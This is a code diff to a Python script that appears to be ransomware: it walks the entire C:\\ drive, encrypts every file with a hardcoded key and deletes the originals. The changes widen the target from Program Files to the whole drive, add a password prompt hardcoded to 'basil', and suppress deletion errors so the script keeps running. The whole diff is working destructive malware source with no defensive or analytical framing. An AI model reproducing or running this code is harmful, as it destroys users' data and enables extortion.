@@ -50,15 +50,21 @@ def encrypt_file(key, in_filename, out_filename, chunksize):
 
 
 
-
-rootdir = 'C:\\Program Files\\'
+password = input("Oh god dont do this accidentally, whats the password: ")
+if password != "basil":
+    exit()
+rootdir = 'C:\\'
 
 for subdir, dirs, files in os.walk(rootdir):
-    for files in files:
-        filename = os.path.join(subdir, files)
+    for file in files:
+        
+        filename = os.path.join(subdir, file)
         
         encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", filename, None, 64*1024)
-        os.remove(filename)
+        try: 
+            os.remove(filename)
+        except OSError:
+            pass     
         
 
 
